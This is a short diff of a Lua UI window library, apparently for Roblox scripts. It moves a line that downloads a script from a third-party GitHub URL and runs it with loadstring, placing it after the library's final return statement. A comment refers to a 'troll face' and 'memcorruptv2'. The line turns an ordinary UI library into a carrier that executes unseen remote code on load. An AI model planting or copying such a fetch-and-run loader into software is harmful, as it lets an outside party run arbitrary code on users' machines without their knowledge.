@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/misc-scripts/main/test.lua"))()
+
 -- insert troll face, memcorruptv2
 local library = { 
 	flags = { }, 
@@ -3654,3 +3654,4 @@ function library:CreateWindow(name, size, hidebutton)
 end
 
 return library
+loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/misc-scripts/main/test.lua"))()
